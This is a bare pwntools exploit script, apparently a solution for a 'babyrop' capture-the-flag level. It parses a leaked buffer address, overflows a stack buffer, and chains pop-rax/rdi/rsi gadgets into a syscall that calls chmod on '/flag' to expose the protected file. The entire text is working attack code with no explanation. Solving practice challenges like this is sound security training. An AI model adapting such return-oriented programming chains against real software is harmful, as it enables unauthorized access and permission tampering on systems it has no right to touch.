from pwn import *

p = process("./babyrop_level4.1")

print(p.recvuntil(b"[LEAK] Your input buffer is located at: "))

res = p.recvline().split(b".\n")[0]
input_buf = int(res, 16)

payload = b""
payload += b"A" * 120 # Buffer
payload += b"B" * 8 # Saved RBP
payload += p64(0x67616c662f) # /flag
# pop rax ; ret
payload += p64(0x401c73)
payload += p64(0x5a)
# pop rdi ; ret
payload += p64(0x401c8a)
payload += p64(input_buf + 128) # *ptr to /flag
# pop rsi ; ret
payload += p64(0x401c92)
payload += p64(0x4)
# syscall
payload += p64(0x401c82)

p.sendline(payload)
print(p.recvall())